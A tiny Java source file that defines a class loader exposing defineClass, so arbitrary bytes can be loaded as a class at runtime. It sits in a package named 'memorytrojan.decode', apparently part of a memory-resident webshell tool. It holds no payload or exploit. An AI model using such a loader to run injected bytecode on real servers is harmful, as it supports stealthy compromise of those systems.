package com.yyjccc.memorytrojan.decode;

public class MyClassLoader extends ClassLoader {
	public Class<?> defineClass(byte[] b) {
		return super.defineClass(b, 0, b.length);
	}
}
